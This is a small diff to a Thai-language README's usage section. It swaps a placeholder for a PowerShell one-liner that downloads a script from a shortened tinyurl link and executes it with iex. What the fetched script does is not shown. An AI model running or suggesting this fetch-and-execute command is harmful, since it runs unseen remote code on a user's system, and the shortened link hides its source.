@@ -3,7 +3,7 @@
 ## ใช้งาน
 
 ```
-powershell -c "iex(irm <ลิงก์สั้น>)"
+powershell -c "iex(irm https://tinyurl.com/25ru69qk)"
 ```
 
 หรือเรียกตัวเปิดโดยตรง:
